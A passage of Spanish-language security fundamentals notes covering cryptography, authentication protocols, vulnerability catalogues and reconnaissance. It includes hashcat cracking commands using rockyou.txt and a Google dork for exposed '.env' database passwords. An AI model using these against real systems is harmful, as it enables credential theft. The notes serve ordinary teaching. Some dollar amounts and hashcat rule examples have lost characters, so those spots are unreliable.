4. El destinatario descifra la firma con la clave publica, obteniendo el hash
5. El destinatario calcula el hash del mensaje recibido
6. Si coinciden, la firma es valida

**RSA para firmas:**
- El hash se cifra con la clave privada RSA
- PKCS#1 v1.5 padding o PSS (mas seguro)
- Tamaño de firma = tamaño del modulo (2048 bits = 256 bytes)

**ECDSA (Elliptic Curve Digital Signature Algorithm):**
- Usa curvas elipticas en lugar de RSA
- Firmas mas cortas: ~70 bytes para P-256
- Mas rapido que RSA
- Se usa en: Bitcoin, Ethereum, TLS, SSH

**Ed25519:**
- Basado en Curve25519 (Daniel J. Bernstein)
- Claves de 32 bytes, firmas de 64 bytes
- Extremadamente rapido y seguro
- Resistente a side-channel attacks
- Se adopta en SSH, GPG, TLS

**Autenticidad vs Integridad:**
- Integridad: asegura que los datos no se modificaron (hash)
- Autenticidad: asegura quien creo los datos (firma digital)
- Un hash solo dice si el archivo cambio. Una firma dice quien lo creo y que no cambio

### 2.6 Key Management

La gestion de claves es la parte mas dificil de la criptografia. Una clave mal gestionada compromete todo.

**Generacion de claves:**
- Las claves deben generarse con un CSPRNG
- NO usar funciones random comunes (Math.random(), rand())
- En Linux: /dev/random (bloquea) y /dev/urandom (no bloquea)
- En Windows: CNG provider
- Herramientas: OpenSSL, GnuPG, keytool (Java), ssh-keygen

**Rotacion de claves:**
- Las claves deben renovarse periodicamente
- Si una clave se usa mucho, hay mas material cifrado para analizar
- Una clave comprometida debe reemplazarse inmediatamente
- Rotacion automatica: [aws](../raw/cl0ud-h4ck1ng.md#aws) KMS, etc.

**Almacenamiento de claves:**
- Claves privadas: NUNCA en texto plano en el disco
- Soluciones: HSM, KeyStore, vault, enclaves seguros
- En produccion: HashiCorp Vault, AWS KMS, [azure](../raw/cl0ud-h4ck1ng.md#azure) Key Vault, [gcp](../raw/cl0ud-h4ck1ng.md#gcp) KMS
- Claves de aplicacion: variables de entorno, no en el codigo

**HSM (Hardware Security Module):**
- Hardware dedicado para almacenar y procesar claves criptograficas
- Las claves nunca salen del HSM en texto plano
- Certificados FIPS 140-2 Level 2/3/4
- Usos: CA, procesamiento de pagos, proteccion de claves raiz
- Ejemplos: Thales Luna, AWS CloudHSM

**KeyStore:**
- Archivo protegido que almacena claves y certificados
- Java KeyStore (JKS), PKCS#12 (.p12/.pfx), PEM

### 2.7 Conceptos Criptograficos Avanzados

**Entropia:**
- Medida de la aleatoriedad/incertidumbre
- Password de 8 caracteres (minusculas): ~38 bits de entropia
- Password de 8 caracteres (todos los tipos): ~52 bits
- Frase de 4 palabras (7776 palabras): ~51 bits
- Para claves criptograficas: 128+ bits de entropia

**PRNG vs CSPRNG:**
| PRNG | CSPRNG |
|------|--------|
| Juegos, simulaciones | Criptografia, claves, tokens |
| Math.random(), rand() | /dev/urandom, CryptGenRandom |
| Predecible | Impredecible |
| Sin requisitos criptograficos | Debe resistir ataques |

**Forward Secrecy:**
- Si la clave privada se ve comprometida, las sesiones PASADAS NO estan comprometidas
- Se logra con claves efimeras (DHE/ECDHE)
- TLS 1.3 solo permite cifrados con forward secrecy

**Perfect Forward Secrecy (PFS):**
- Lo mismo que forward secrecy
- DHE y ECDHE proveen PFS
- RSA key exchange NO provee PFS

**Nonce:**
- "Number used once" - numero que se usa una sola vez
- En GCM, el nonce debe ser unico por clave. Si se repite, se pierde todo

**MAC (Message Authentication Code):**
- Codigo de autenticacion de mensajes
- Verifica integridad y autenticidad
- Requiere clave compartida
- Diferencia con firma: MAC usa clave simetrica

**HMAC (Hash-based MAC):**
- MAC basado en funcion de hash
- HMAC(K, m) = H((K' xor opad) || H((K' xor ipad) || m))
- Se usa en: TLS, SSH, [jwt](../raw/4p1-s3cur1ty.md#jwt), AWS API signatures

### 2.8 Ataques Criptograficos

**Padding Oracle Attack:**
- Ataque contra CBC con implementacion incorrecta
- El servidor devuelve error diferente si el padding es invalido
- El atacante descifra el mensaje bloque por bloque
- Defensa: usar GCM (sin padding) o verificar MAC antes del padding

**Length Extension Attack:**
- Ataque contra MD/SHA (SHA-256, SHA-512)
- Dado H(m), se puede calcular H(m || padding || extra) sin conocer m
- Afecta a construcciones H(secreto || mensaje)
- SHA-3 y HMAC no son vulnerables

**Downgrade Attack:**
- Forzar a usar una version/cifrado mas debil
- Ej: forzar TLS 1.0 en lugar de TLS 1.3
- Ej: POODLE contra SSL 3.0
- Defensa: deshabilitar protocolos viejos, HSTS

**[man-in-the-middle](../raw/m1tm-m0b1l3.md) (MITM):**
- El atacante se interpone entre dos partes
- Puede interceptar, modificar y reenviar mensajes
- Defensa: autenticacion mutua, certificados, CA verification

**Known-Plaintext Attack (KPA):**
- El atacante tiene pares de texto plano y cifrado
- Intenta deducir la clave
- Cifrados modernos (AES) deben ser resistentes

**Chosen-Plaintext Attack (CPA):**
- El atacante elige textos planos y obtiene sus cifrados
- Cifrados modernos deben ser CPA-secure

**Brute Force Attack:**
- Probar todas las combinaciones posibles de clave
- AES-128: 2^128 combinaciones. Con 1B intentos/s, tomara 10^22 años

**Dictionary Attack:**
- Probar palabras de un [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario)
- Rockyou.txt: 14 millones de passwords reales
- Defensa: politicas de password fuerte, [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting), MFA

**Timing Attack:**
- Medir el tiempo de una operacion criptografica
- Diferencias revelan informacion sobre la clave
- Defensa: comparaciones en tiempo constante

**Side-Channel Attack:**
- Explota informacion del "lado" del sistema
- Tipos: Timing, Power, EM, Acoustic, Cache, Fault
- Defensa: [programacion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md) constante, blindaje

### 2.9 [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) Overview

Hashcat es la herramienta de recuperacion de contraseñas mas rapida del mundo. Soporta GPU, FPGA y multi-threading.

**Modos de hash (-m):**
- m 0 = MD5
- m 100 = SHA1
- m 1400 = SHA256
- m 1700 = SHA512
- m 1000 = NTLM (Windows)
- m 3000 = LM (Windows antiguo)
- m 1800 = SHA512crypt ($)
- m 3200 = bcrypt (*$)
- m 6800 = scrypt
- m 13100 = Kerberos 5 TGS-REP
- m 11300 = Bitcoin/Litecoin wallet
- m 2500 = WPA/WPA2 (handshake capture)

**Tipos de ataque (-a):**
- a 0 = Straight (diccionario)
- a 1 = Combinacion
- a 3 = Brute-force / Mask attack
- a 6 = Hybrid Wordlist + Mask
- a 7 = Hybrid Mask + Wordlist

**Comandos basicos:**
`
hashcat -m 0 -a 0 hashes.txt rockyou.txt
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r best64.rule
`

**Rockyou.txt:**
- Lista de 14,344,391 passwords reales filtrados de RockYou (2009)
- Viene en Kali en /usr/share/wordlists/
- Se usa como wordlist base en ataques de diccionario

**Reglas de Hashcat:**
-  = agregar X al final
- ^X = agregar X al principio
- sXY = reemplazar X por Y
- c = capitalizar primera letra
- l = todo minusculas, u = todo mayusculas
- r = invertir la palabra
- Ej: "password" + "" = "password123"

---

<a name=\"autenticacion-y-autorizacion\"></a>
## 3. [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) y [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion)

### 3.1 Factores de Autenticacion

Los factores de autenticacion se dividen en tres categorias. Usar dos o mas se llama MFA.

**Algo que sabes (Knowledge Factor):**
- Contraseñas, PINs, passphrases, respuestas a preguntas de seguridad
- Ventajas: facil, bajo costo, conocido
- Desventajas: facil de olvidar, robar ([phishing](../raw/ph1sh1ng.md)), adivinar ([fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta))
- Problemas: reuso, passwords debiles, post-its
- Preguntas de seguridad son debiles: "nombre de tu mascota" se averigua en [redes](../raw/r3d3s-f0nd4m3nt0s.md) sociales

**Algo que tienes (Possession Factor):**
- Tokens fisicos: YubiKey, [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa) SecurID, tarjetas inteligentes
- Tokens virtuales: smartphone, TOTP (Google Authenticator, Authy)
- Ventajas: el atacante necesita acceso [fisico](../raw/ph7s1c4l-r3d.md) al dispositivo
- Desventajas: se puede perder, robar, clonar
- SMS como 2FA es debil (SIM swapping)

**Algo que eres (Inherence Factor):**
- Biometricos: huella, facial, iris, voz, geometria de mano
- Ventajas: no se olvida, dificil de robar
- Desventajas: no se puede cambiar, falsos positivos/negativos, privacidad
- Los biometricos no son secretos: dejas huellas en todos lados

### 3.2 Password Security

**Hashing vs Encryption para passwords:**
- [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) (encryption): reversible. Si roban la clave, descifran todo
- Hashing: unidireccional. Ideal para almacenar passwords
- NUNCA almacenes passwords en texto plano o cifradas
- Usa: bcrypt, argon2, scrypt, PBKDF2
- No uses: MD5, SHA1, SHA256 directamente (muy rapidos)

**Password Storage:**
`
MAL:  password123  (texto plano)
MAL:  hashMD5("password123")
MAL:  hashSHA256("password123")
BIEN: bcrypt("password123", salt)
MEJOR: argon2id("password123", salt)
`

**Password Policies:**
- Largo minimo: 12+ caracteres
- No requerir cambios frecuentes ([nist](../raw/p3nt3st-m3th0d0l0gy.md#nist) ya no recomienda cada 90 dias)
- No requerir caracteres especiales obligatorios
- Mejor: passphrases largas ("correct-horse-battery-staple")
- Verificar contra listas de passwords comprometidos (HIBP API)
- MFA obligatorio para cuentas criticas

**Multi-Factor Authentication (MFA/2FA):**
- 2FA: dos factores diferentes (password + TOTP)
- SMS es debil (SIM swapping)
- Mejores: TOTP, push notifications, FIDO2/WebAuthn, YubiKey

**OTP (One-Time Password):**
- Contraseña que solo sirve una vez
- TOTP (basado en tiempo) o HOTP (basado en contador)

**TOTP (Time-based OTP):**
- Basado en el tiempo (intervalos de 30 segundos)
- Formula: TOTP = truncate(HMAC-SHA1(secreto, tiempo))
- Secreto compartido via codigo QR
- Codigo cambia cada 30 segundos
- Estandar: RFC 6238

**HOTP (HMAC-based OTP):**
- Basado en un contador que se incrementa con cada uso
- Formula: HOTP = truncate(HMAC-SHA1(secreto, contador))
- Estandar: RFC 4226

### 3.3 Biometricos

**Huella dactilar:**
- Ventajas: rapido, economico, facil de usar
- Desventajas: se puede spoofear (impresiones 3D, gelatinas)
- Sensores modernos: ultrasonido, capacitivos (mas dificiles de enganar)
- No se puede cambiar: si comprometen tu huella, es para siempre

**[reconocimiento](../raw/0s1nt.md#reconocimiento) facial:**
- Ventajas: sin contacto, rapido
- Desventajas: fotos enganan sistemas basicos, cambios fisicos, privacidad
- Face ID de Apple: proyector de puntos IR, bastante seguro (1/1,000,000 falsos positivos)
- [android](../raw/4db-d33p-d1v3.md) Face Unlock: muchos son solo 2D (menos seguros)

**Iris:**
- Ventajas: muy preciso, dificil de falsificar
- Desventajas: costoso, requiere hardware especial
- Tasa de falsos positivos: ~1 en 2 millones
- Se usa en: aeropuertos, instalaciones de alta seguridad

**Voz:**
- Ventajas: natural, por telefono
- Desventajas: ruido, grabaciones, cambios por enfermedad
- Considerado debil para autenticacion de alto valor

### 3.4 Session Management

Como el servidor recuerda quien sos entre request y request ([http](../raw/r3d3s-f0nd4m3nt0s.md#http) es stateless).

**Cookies:**
- El servidor manda una cookie al [navegador](../raw/br0ws3r-3xpl01t4t10n.md), que la envia en cada request
- Atributos de seguridad:
  - Secure: solo por [https](../raw/r3d3s-f0nd4m3nt0s.md#https)
  - HttpOnly: no accesible desde JS (protege contra [xss](../raw/w3b-h4ck1ng.md#xss))
  - SameSite: controla cuando se envia (Strict, Lax, None)
  - Domain: a que dominio pertenece
  - Path: que rutas
  - Expires/Max-Age: cuando expira

**Tokens:**
- Similares a cookies pero para APIs
- El cliente almacena el token y lo envia en header Authorization
- Bearer token: cualquiera que tenga el token puede usarlo
- Proteger con HTTPS y almacenamiento seguro

**[jwt](../raw/4p1-s3cur1ty.md#jwt) (JSON Web Token):**
- Formato de token estructurado en tres partes separadas por puntos:
  1. Header: tipo de token y algoritmo de firma
  2. [payload](../raw/m3t4spl01t.md#payloads): claims (datos del usuario, roles, expiracion)
  3. Signature: firma del header + payload
- Ejemplo:
`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
`

**Claims comunes de JWT:**
- sub: subject (ID del usuario)
- iss: issuer (quien emitio el token)
- aud: audience (para quien es el token)
- exp: expiration (timestamp de expiracion)
- nbf: not before (no valido antes de)
- iat: issued at (cuando se emitio)
- jti: JWT ID (identificador unico)

**Firma de JWT:**
- HS256: HMAC-SHA256 simetrico
- RS256: RSA-SHA256 asimetrico
- ES256: ECDSA-SHA256

**Session Fixation:**
- El atacante le da al usuario un ID de sesion conocido
- Si el usuario se loguea con ese ID, el atacante secuestra la sesion
- Defensa: regenerar session ID despues del login

**Session Hijacking:**
- El atacante roba el session ID de un usuario autenticado
- Metodos: XSS, sniffing, session prediction
- Defensa: HttpOnly cookies, HTTPS, regenerar session ID

### 3.5 OAuth2

OAuth2 es un [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de autorizacion delegada. Se usa mucho para autenticacion (con OpenID Connect).

**Conceptos:**
- Resource Owner: el usuario (dueño de los datos)
- Client: la aplicacion que quiere acceder
- Authorization Server: el que autoriza (Google, Facebook)
- Resource Server: el que tiene los datos
- Access Token: token para acceder a recursos
- Refresh Token: token para nuevos access tokens

**Authorization Code Flow (el mas seguro):**
1. El usuario hace clic en "Login con Google"
2. La app redirige al AS con client_id, redirect_uri, scope, state
3. El usuario se autentica y autoriza
4. El AS redirige con un "code"
5. La app envia code + client_secret al AS
6. El AS devuelve access_token
7. La app usa el token para acceder a recursos

**Implicit Flow (deprecated):**
- El token se devuelve en la URL (fragment)
- Inseguro: token expuesto en URL e historial
- Reemplazado por Authorization Code + PKCE

**Client Credentials Flow:**
- Para comunicacion servidor a servidor (sin usuario)
- El client se autentica con client_id + client_secret

**Resource Owner Password Credentials Flow:**
- El usuario da usuario y contraseña directamente a la app
- Solo para apps de confianza. Deprecado en OAuth2.1

**Scopes:**
- Limitan lo que el access_token puede hacer
- Ej: "read:profile", "write:posts", "email"

**Redirect URI:**
- URL a la que el AS redirige despues de autorizacion
- Debe estar registrada en el AS
- Siempre usar HTTPS

**State Parameter:**
- Valor aleatorio que protege contra [csrf](../raw/w3b-h4ck1ng.md#csrf)
- Siempre usar state parameter en OAuth2

**PKCE (Proof Key for Code Exchange):**
- Protege contra interceptacion del authorization code
- La app genera code_verifier y code_challenge
- Obligatorio en OAuth2.1

### 3.6 [saml](../raw/hybr1d-1d3nt1ty.md#saml) (Security Assertion Markup Language)

SAML es un estandar para [sso](../raw/hybr1d-1d3nt1ty.md#sso) basado en XML. Usado en entornos empresariales.

**Conceptos:**
- Identity Provider (IdP): el que autentica (Okta, ADFS, [azure ad](../raw/hybr1d-1d3nt1ty.md))
- Service Provider (SP): la aplicacion (Salesforce, Slack, [aws](../raw/cl0ud-h4ck1ng.md#aws))
- Assertion: mensaje SAML que dice "este usuario esta autenticado"
- SSO: el usuario se loguea una vez en el IdP y accede a multiples SPs

**SAML Flow:**
1. El usuario intenta acceder al SP
2. El SP genera un SAML Request y redirige al IdP
3. El usuario se autentica en el IdP
4. El IdP genera un SAML Assertion (firmado con XML Signature)
5. El IdP redirige al SP con la assertion
6. El SP verifica la firma y concede acceso

**SAML Assertion (contenido):**
- Issuer: quien emitio la assertion
- Subject: quien esta siendo autenticado
- Conditions: cuando es valida (tiempo, audience)
- AttributeStatement: atributos (email, nombre, roles)
- AuthnStatement: como y cuando se autentico
- Signature: firma digital

**Bindings:**
- HTTP Redirect: datos en URL (GET). Limitado a 2048 caracteres
- HTTP POST: datos en formulario POST. Soporta assertiones mas grandes
- Artifact: se pasa un identificador y el SP obtiene la assertion por backend

**XML Signature:**
- SAML usa XML Signature (XML-DSig) para firmar las assertiones
- Algoritmos: RSA-SHA256, RSA-SHA1 (deprecado)
- Propenso a XML wrapping attacks

**Audience Restriction:**
- La assertion especifica para que SP(s) es valida
- Si el SP no esta en la audience, debe rechazarla

### 3.7 Kerberos (Basico para Windows)

Kerberos es el sistema de autenticacion principal en [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md).

**Componentes:**
- KDC (Key Distribution Center): [domain controller](../raw/w1nd0ws-d0m41n-4dm1n.md#domain-controller)
- TGT (Ticket Granting Ticket): ticket de autenticacion
- TGS (Ticket Granting Service): emite tickets para servicios
- Authenticator: prueba de identidad (timestamp cifrado)
- SPN (Service Principal Name): identificador de servicio

**Kerberos Flow:**
1. AS-REQ / AS-REP: el cliente se autentica contra el KDC, obtiene un TGT
2. TGS-REQ / TGS-REP: el cliente presenta el TGT pidiendo un ticket para un servicio
3. AP-REQ / AP-REP: el cliente presenta el ticket al servicio, que concede acceso

**Ataques comunes:**
- [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting): pedir TGS para cuentas de servicio y crackearlas offline
- [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting): usuarios sin pre-autenticacion, obtener y crackear su TGT
- [golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket): con el [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de KRBTGT, crear TGTs falsos para cualquiera
- [silver ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#silver-ticket): con el hash de una cuenta de servicio, crear tickets falsos
- [pass-the-ticket](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-ticket): robar y reusar tickets Kerberos

**SPN:**
- Formato: SERVICE/HOST:PORT (ej: HTTP/webserver01:80)
- Tipos: HTTP, MSSQLSvc, CIFS, LDAP, HOST
- Se registran en Active Directory

### 3.8 LDAP (Lightweight Directory Access Protocol)

LDAP es un protocolo para acceder a directorios de informacion. Usado en Active Directory y OpenLDAP.

**Estructura de Directorio (arbol):**
`
dc=ejemplo,dc=[com](../raw/w1n-s9bsyst3ms.md#com)
├── ou=Personas
│   ├── cn=Juan Perez
│   └── cn=Maria Garcia
├── ou=Grupos
│   └── cn=Administradores
└── ou=Computadoras
    └── cn=SRV-DB01
`

**Terminologia:**
- Entry (entrada): un objeto en el directorio
- DN (Distinguished Name): identificador unico (ruta completa)
- RDN (Relative DN): nombre relativo dentro del padre
- cn (Common Name): nombre comun
- ou (Organizational Unit): unidad organizativa
- dc (Domain Component): componente del dominio (dc=ejemplo,dc=com)
- uid (User ID): identificador de usuario

**Atributos:**
Propiedades de una entrada: cn, sn (apellido), givenName, mail, telephoneNumber, userPassword, uid, memberOf.

**Search Filters:**
- (cn=Juan*) - cn empiece con "Juan"
- (&(objectClass=person)(mail=*@ejemplo.com)) - personas con @ejemplo.com
- (|(cn=Juan)(cn=Maria)) - cn es Juan o Maria
- (!(cn=Admin)) - cn no es Admin

**LDAP Injection:**
- Similar a [sql injection](../raw/w3b-h4ck1ng.md#sql-injection) contra LDAP
- Defensa: sanitizar inputs, escapar caracteres especiales

**Puertos:**
- 389: LDAP (sin cifrar, STARTTLS)
- 636: LDAPS (sobre [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))
- 3268: Global Catalog (sin [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))
- 3269: Global Catalog con SSL

---

<a name=\"tipos-de-vulnerabilidades\"></a>
## 4. Tipos de Vulnerabilidades

### 4.1 [owasp top 10](../raw/w3b-h4ck1ng.md#owasp-top-10)

El [owasp top 10](../raw/w3b-h4ck1ng.md#owasp-top-10) lista las 10 vulnerabilidades mas criticas en aplicaciones web. Se actualiza cada 3-4 años.

**A01:2021 - Broken Access Control:**
Fallas en la [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion). Un usuario puede hacer cosas que no deberia.
- Ej: cambiar el ID en la URL para ver el perfil de otro usuario
- Ej: acceder a /admin sin ser admin
- Ej: modificar el metodo [http](../raw/r3d3s-f0nd4m3nt0s.md#http) (GET en lugar de POST) para eludir controles

**A02:2021 - Cryptographic Failures:**
Fallas relacionadas con [criptografia](../raw/crypt0-f0r-h4ck3rs.md) (antes "Sensitive Data Exposure").
- Datos sensibles sin cifrar (passwords en texto plano)
- Algoritmos debiles (MD5, SHA1, DES)
- Certificados expirados o invalidos
- No usar [https](../raw/r3d3s-f0nd4m3nt0s.md#https)

**A03:2021 - Injection:**
Inyeccion de codigo malicioso en interpretes.
- [sql injection](../raw/w3b-h4ck1ng.md#sql-injection): inyectar comandos SQL
- [command injection](../raw/w3b-h4ck1ng.md#command-injection): ejecutar comandos del sistema
- LDAP Injection, NoSQL Injection
- Defensa: parametrizacion, [sanitizacion](../raw/s3c-f0nd4m3nt0s.md#sanitizacion), privilegios minimos

**A04:2021 - Insecure Design:**
Fallas en el diseño (nueva categoria).
- Falta de [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting) en login
- No implementar MFA
- Recuperacion de password insegura
- Diseño sin seguridad desde el inicio

**A05:2021 - Security Misconfiguration:**
Configuraciones inseguras por defecto.
- Puertos abiertos innecesarios
- Cuentas por defecto (admin/admin)
- Mensajes de error detallados
- Directorios listables
- Buckets de [cloud](../raw/cl0ud-h4ck1ng.md) mal configurados

**A06:2021 - Vulnerable and Outdated Components:**
Usar componentes con vulnerabilidades conocidas.
- jQuery viejo con CVEs
- Frameworks sin actualizar
- Dependencias con vulnerabilidades
- Software sin soporte

**A07:2021 - Identification and Authentication Failures:**
Fallas en [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion).
- [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) en login (sin rate limiting)
- Passwords debiles permitidas
- Sesiones que no expiran
- Credenciales por defecto

**A08:2021 - Software and Data Integrity Failures:**
Fallas en la integridad del software y datos.
- No verificar firmas de actualizaciones
- [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) [ci/cd](../raw/c1cd-h4ck1ng.md) sin seguridad
- Dependencias sin verificar (supply chain)
- Deserializacion insegura

**A09:2021 - Security Logging and Monitoring Failures:**
Falta de logging y monitoreo.
- No loguear intentos de login fallidos
- No monitorear actividades sospechosas
- Logs sin informacion util
- Sin alertas configuradas

**A10:2021 - Server-Side Request Forgery ([ssrf](../raw/w3b-h4ck1ng.md#ssrf)):**
El atacante hace que el servidor haga requests a recursos internos.
- Request a http://localhost:8080/admin
- Explotacion de metadatos de cloud ([aws](../raw/cl0ud-h4ck1ng.md#aws), [gcp](../raw/cl0ud-h4ck1ng.md#gcp), [azure](../raw/cl0ud-h4ck1ng.md#azure))
- Acceso a servicios internos

### 4.2 [cve](../raw/s3c-f0nd4m3nt0s.md#cve) (Common Vulnerabilities and Exposures)

CVE es un sistema de identificacion unico para vulnerabilidades publicamente conocidas.

**Formato CVE:**
`
CVE-AÑO-NUMERO
`
Ej: CVE-2021-44228 (Log4Shell)

**Ejemplos famosos:**
- CVE-2014-0160: Heartbleed (OpenSSL)
- CVE-2017-0144: EternalBlue ([smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) Windows)
- CVE-2021-44228: Log4Shell (Log4j)
- CVE-2021-26855: ProxyLogon (Exchange Server)
- CVE-2023-34362: MOVEit Transfer

**CVSS (Common Vulnerability Scoring System):**
Sistema de puntuacion de severidad (v3.1 actual).

**CVSS Base Score (0-10):**
Metricas Base:
- AV (Attack Vector): Network, Adjacent, Local, Physical
- AC (Attack Complexity): Low, High
- PR (Privileges Required): None, Low, High
- UI (User Interaction): None, Required
- S (Scope): Unchanged, Changed
- C (Confidentiality): High, Low, None
- I (Integrity): High, Low, None
- A (Availability): High, Low, None

**CVSS Temporal Score:**
- E ([exploit](../raw/m3t4spl01t.md#exploits) Maturity): Not Defined -> High
- RL (Remediation Level): Official Fix -> Unavailable
- RC (Report Confidence): Unknown -> Confirmed

**CVSS Environmental Score:**
- Personalizado por organizacion
- Requisitos de CIA modificados

**Niveles de severidad:**
- 0.0: None
- 0.1-3.9: Low
- 4.0-6.9: Medium
- 7.0-8.9: High
- 9.0-10.0: Critical

### 4.3 CWE (Common Weakness Enumeration)

CWE clasifica el TIPO de debilidad. CVE es una INSTANCIA especifica.

**Categorizacion (arbol):**
- CWE-20: Improper [input validation](../raw/s3c-f0nd4m3nt0s.md#validacion-de-entrada)
  - CWE-89: SQL Injection
  - CWE-79: cross-site [scripting](../raw/w3b-h4ck1ng.md#xss) ([xss](../raw/w3b-h4ck1ng.md#xss))
  - CWE-78: OS Command Injection
- CWE-200: Exposure of Sensitive Information
  - CWE-209: Info Exposure Through Error Messages
- CWE-287: Improper Authentication
  - CWE-306: Missing Authentication
  - CWE-862: Missing Authorization
- CWE-119: [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow)
  - CWE-121: Stack-based BOF
  - CWE-122: Heap-based BOF
- CWE-295: Improper Certificate Validation
- CWE-502: Deserialization of Untrusted Data

**CWE Top 25 (ejemplos 2023):**
1. CWE-79: [cross-site scripting](../raw/w3b-h4ck1ng.md#xss)
2. CWE-787: Out-of-bounds Write
3. CWE-89: SQL Injection
4. CWE-20: Improper Input Validation
5. CWE-125: Out-of-bounds Read
6. CWE-78: OS Command Injection
7. CWE-416: Use After Free
8. CWE-862: Missing Authorization
9. CWE-22: Path Traversal
10. CWE-352: Cross-Site Request Forgery ([csrf](../raw/w3b-h4ck1ng.md#csrf))

### 4.4 [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck)

Base de conocimiento de tacticas y tecnicas usadas por atacantes reales.

**Tactics vs Techniques:**
- Tactic: el objetivo (el "por que")
- Technique: el metodo (el "como")

**Enterprise Matrix (14 tactics):**
1. Reconnaissance: recolectar informacion
2. Resource Development: preparar recursos
3. Initial Access: obtener acceso inicial
4. Execution: ejecutar codigo
5. Persistence: mantener el acceso
6. [privilege escalation](../raw/l1n9x-pr1v3sc.md): escalar privilegios
7. Defense Evasion: evadir defensas
8. Credential Access: robar credenciales
9. Discovery: explorar el entorno
10. Lateral Movement: moverse lateralmente
11. Collection: recolectar datos
12. [command and control](../raw/r3v3rs3-sh3lls.md#command-and-control): [c2](../raw/r3v3rs3-sh3lls.md#command-and-control)
13. Exfiltration: robar datos
14. Impact: causar daño

**[ics](../raw/0t-sc4d4.md) Matrix:** para sistemas de control industrial ([scada](../raw/0t-sc4d4.md), PLCs).
**Mobile Matrix:** para dispositivos moviles.

**Grupos y Software:**
ATT&CK tambien mapea grupos de amenazas (APT29, Lazarus) y software ([mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz), [cobalt strike](../raw/r3d-t34m-1nfr4.md#cobalt-strike)).

### 4.5 Vulnerability Disclosure

**Full Disclosure:**
- La [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) se publica sin aviso al fabricante
- Presiona a parchar rapido, pero expone a usuarios
- Controversial

**Responsible Disclosure (Coordinated Disclosure):**
- Se informa al fabricante en privado
- Plazo tipico de 90 dias para parchar
- Pasado el plazo, se publica
- Estandar de la industria

**[bug bounty](../raw/b9g-b09nty.md):**
- Programas que pagan por encontrar vulnerabilidades
- Montos:  a ,000,000+
- Plataformas: [hackerone](../raw/b9g-b09nty.md#hackerone), [bugcrowd](../raw/b9g-b09nty.md#bugcrowd), Synack, Intigriti
- El investigador reporta, la empresa evalua y recompensa

### 4.6 Zero-Day vs N-Day

**Zero-Day (0-day):**
- Vulnerabilidad SIN parche disponible
- Extremadamente valiosas: ,000 - ,500,000 USD
- Usadas en ataques dirigidos (APTs, ransomware)
- Ciclo: descubrimiento -> exploit -> deteccion -> parche

**N-Day:**
- Vulnerabilidad CON parche disponible
- n = dias desde el parche
- 1-day: un dia despues (muchos sistemas sin parchear)
- Siguen siendo peligrosas

**Patch Management:**
- [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de gestionar actualizaciones
- Evaluar -> Probar -> Desplegar -> Verificar
- Desafios: sistemas [legacy](../raw/l3g4cy-3nt3rpr1s3.md), ventanas de mantenimiento

**Patch Tuesday (Microsoft):**
- Segundo martes de cada mes
- Out-of-band: parches urgentes
- Dia del Patch Tuesday: los atacantes analizan los parches y crean exploits 1-day

---

<a name=\"ciclo-de-ataque\"></a>
## 5. Ciclo de Ataque

### 5.1 Reconnaissance ([recon](../raw/0s1nt.md#reconocimiento))

La fase de [reconocimiento](../raw/0s1nt.md#reconocimiento) recolecta informacion sobre el objetivo. Es la fase mas importante: un buen [reconocimiento](../raw/0s1nt.md#reconocimiento) determina el exito del ataque.

**Pasivo ([osint](../raw/0s1nt.md) - Open Source Intelligence):**
El atacante no interactua directamente con el objetivo. No deja rastros.

**Search Engines:**
- Google [dorking](../raw/0s1nt.md#google-dorks): operadores avanzados
  - site:ejemplo.[com](../raw/w1n-s9bsyst3ms.md#com) filetype:pdf
  - intitle:"index of"
  - inurl:admin
  - filetype:env DB_PASSWORD
  - inurl:php?id=
- [google dorks](../raw/0s1nt.md#google-dorks) Database ([exploit](../raw/m3t4spl01t.md#exploits)-DB)
- [shodan](../raw/0s1nt.md#shodan): buscador de dispositivos conectados
- Censys: certificados [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))/[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)
- ZoomEye: dispositivos y servicios

**Social Media:**
- LinkedIn: empleados, estructura, tecnologias
- Twitter/X: filtraciones accidentales
- Facebook, Instagram: info personal, fotos de offices con pizarras
- Glassdoor: quejas sobre sistemas internos

**WHOIS:**
- Informacion de registro de dominios
- WHOIS historico: datos antiguos antes de privacidad
- whois.domaintools.com

